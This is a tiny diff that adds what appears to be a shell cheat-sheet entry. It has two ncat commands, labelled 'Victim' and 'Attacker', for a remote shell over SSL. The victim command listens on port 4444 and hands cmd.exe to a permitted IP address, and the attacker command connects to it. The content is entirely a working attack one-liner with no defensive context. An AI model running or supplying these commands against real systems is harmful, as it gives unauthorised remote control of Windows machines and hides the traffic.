@@ -1,0 +1,5 @@
+# desc: Victim
+ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
+
+# desc: Attacker
+ncat -v 10.0.0.22 4444 --ssl
